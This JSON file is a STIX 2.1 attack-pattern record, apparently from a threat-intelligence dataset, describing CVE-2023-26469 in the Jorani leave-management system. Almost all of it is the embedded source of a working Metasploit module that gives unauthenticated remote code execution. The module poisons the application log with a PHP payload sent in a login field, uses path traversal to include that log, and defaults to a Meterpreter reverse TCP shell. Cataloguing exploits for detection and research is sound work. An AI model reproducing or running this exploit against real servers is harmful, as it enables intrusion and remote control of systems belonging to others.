{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3ee3a99-c53d-4049-9573-19b1f7e3f05f",
    "created": "2024-08-14T17:05:23.855725Z",
    "modified": "2024-08-14T17:05:23.855729Z",
    "name": "Jorani unauthenticated Remote Code Execution",
    "description": " This module exploits an unauthenticated Remote Code Execution in Jorani prior to 1.0.2. It abuses 3 vulnerabilities: log poisoning and redirection bypass via header spoofing, then it uses path traversal to trigger the vulnerability. It has been tested on Jorani 1.0.0.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/php/jorani_path_trav.rb",
            "external_id": "jorani_path_trav.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-26469"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Jorani unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits an unauthenticated Remote Code Execution in Jorani prior to 1.0.2.\n          It abuses 3 vulnerabilities: log poisoning and redirection bypass via header spoofing, then it uses path traversal to trigger the vulnerability.\n          It has been tested on Jorani 1.0.0.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'RIOUX Guilhem (jrjgjk)'\n        ],\n        'References' => [\n          ['CVE', '2023-26469'],\n          ['URL', 'https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py']\n        ],\n        'Platform' => %w[php],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['Jorani < 1.0.2', {}]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'DisclosureDate' => '2023-01-06',\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path of Jorani', '/'])\n      ]\n    )\n  end\n\n  def get_version(res)\n    footer_text = res.get_html_document.xpath('//div[contains(@id, \"footer\")]').text\n    matches = footer_text.scan(/v([0-9.]+)/i)\n    if matches.nil? || matches[0].nil?\n      print_error('Cannot recovered Jorani version...')\n      return nil\n    end\n    matches[0][0]\n  end\n\n  def service_running(res)\n    matches = res.get_html_document.xpath('//head/meta[@description]/@description').text.downcase.scan(/leave management system/)\n    if matches.nil?\n      print_error(\"Jorani doesn't appear to be running on the target\")\n      return false\n    end\n    true\n  end\n\n  def recover_csrf(res)\n    csrf_token = res.get_html_document.xpath('//input[@name=\"csrf_test_jorani\"]/@value').text\n    return csrf_token if csrf_token.length == 32\n\n    nil\n  end\n\n  def check\n    # For the check command\n    print_status('Checking Jorani version')\n    uri = normalize_uri(target_uri.path, 'index.php')\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => \"#{uri}/session/login\"\n    )\n\n    if res.nil?\n      return Exploit::CheckCode::Safe('There was a problem accessing the login page')\n    end\n\n    return Exploit::CheckCode::Safe unless service_running(res)\n\n    print_good('Jorani seems to be running on the target!')\n\n    current_version = get_version(res)\n    return Exploit::CheckCode::Detected if current_version.nil?\n\n    print_good(\"Found version: #{current_version}\")\n    current_version = Rex::Version.new(current_version)\n\n    return Exploit::CheckCode::Appears if current_version < Rex::Version.new('1.0.2')\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # Main function\n    print_status('Trying to exploit LFI')\n\n    path_trav_payload = '../../application/logs'\n    header_name = Rex::Text.rand_text_alpha_upper(16)\n    poison_payload = \"<?php if(isset($_SERVER['HTTP_#{header_name}'])){ #{payload.encoded} } ?>\"\n    log_file_name = \"log-#{Time.now.strftime('%Y-%m-%d')}\"\n\n    uri = normalize_uri(target_uri.path, 'index.php')\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'uri' => \"#{uri}/session/login\"\n    )\n\n    if res.nil?\n      print_error('There was a problem accessing the login page')\n      return\n    end\n\n    print_status('Recovering CSRF token')\n    csrf_tok = recover_csrf(res)\n    if csrf_tok.nil?\n      print_status('CSRF not found, doesn\\'t mean its not vulnerable')\n    else\n      print_good(\"CSRF found: #{csrf_tok}\")\n    end\n    print_status('Poisoning log with payload..')\n    print_status('Sending 1st payload')\n\n    send_request_cgi(\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'uri' => \"#{uri}/session/login\",\n      'data' => \"csrf_test_jorani=#{csrf_tok}&\"                  \\\n                'last_page=session/login&'                       \\\n                \"language=#{path_trav_payload}&\"                 \\\n                \"login=#{Rex::Text.uri_encode(poison_payload)}&\" \\\n                \"CipheredValue=#{Rex::Text.rand_text_alpha(14)}\"\n    )\n\n    print_status(\"Including poisoned log file #{log_file_name}.php\")\n    vprint_warning('The date on the attacker and victim machine must be the same for the exploit to be successful due to the timestamp on the poisoned log file. Be careful running this exploit around midnight across timezones.')\n    print_good('Triggering payload')\n\n    send_request_cgi(\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'uri' => \"#{uri}/pages/view/#{log_file_name}\",\n      'headers' =>\n      {\n        'X-REQUESTED-WITH' => 'XMLHttpRequest',\n        header_name => Rex::Text.rand_text_alpha(14)\n      }\n    )\n\n    nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-01-06",
    "x_mitre_platforms": [
        "%w[php]"
    ]
}